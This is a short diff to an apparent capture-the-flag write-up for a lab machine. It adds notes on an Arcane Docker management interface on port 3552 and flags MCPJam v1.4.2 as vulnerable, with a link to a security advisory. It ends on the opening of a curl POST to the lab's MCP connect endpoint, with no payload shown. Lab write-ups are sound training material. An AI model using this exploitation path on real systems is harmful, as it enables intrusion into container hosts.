@@ -72,7 +72,7 @@ PORT     STATE SERVICE
 ```
 ### Service Enumeration
 
-The port 3552 
+The port 3552 is hosting an Arcane instance, an interface for managing Docker containers, images, networks, and volumes.
 
 IMAGE 1
 
@@ -120,7 +120,10 @@ bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Dura
 
 ```
 
-MCPJam Version: v1.4.2 is vulnerabe
+MCPJam Version: v1.4.2 is vulnerable
+Poc: https://github.com/advisories/GHSA-232v-j27c-5pp6
+
+IMAGE 2
 
 ```
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
